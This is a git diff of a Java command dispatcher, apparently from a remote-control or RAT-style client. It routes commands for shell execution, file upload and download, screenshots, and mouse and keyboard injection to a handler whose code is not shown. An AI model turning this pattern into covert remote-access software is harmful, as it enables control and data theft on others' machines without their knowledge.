@@ -1,27 +1,27 @@
 package commend;
 
-import util.RuntimeUtil;
-
 public class Commend {
+
+    private static CommandOper commandOper = new CommandOperImpl();
 
     public static void parseCommand(String command) {
         if (command != null && !command.trim().equals("")) {
             if (command.startsWith("cmd:")) {
-                //执行shell命令
-                RuntimeUtil.exeCommadn(command.replace("cmd:", "").split(" "));
-            } else if (command.startsWith("getfile:")) {
-                //上传文件到服务端
-
-
-            } else if (command.startsWith("downfile:")) {
-
-
-
+                commandOper.cmd(command);
+            } else if (command.startsWith("getfile::")) {
+                commandOper.getfile(command);
+            } else if (command.startsWith("downfile::")) {
+                commandOper.downfile(command);
             } else if (command.startsWith("opensoft:")) {
-                //打开应用
-
+                commandOper.opensoft(command);
             } else if (command.startsWith("http:")) {
-
+                commandOper.http(command);
+            } else if (command.startsWith("shotscreen::")) {
+                commandOper.shotscreen(command);
+            } else if (command.startsWith("mouse::")) {
+                commandOper.mouse(command);
+            } else if (command.startsWith("keyevent")) {
+                commandOper.keyevent(command);
             }
         }
     }
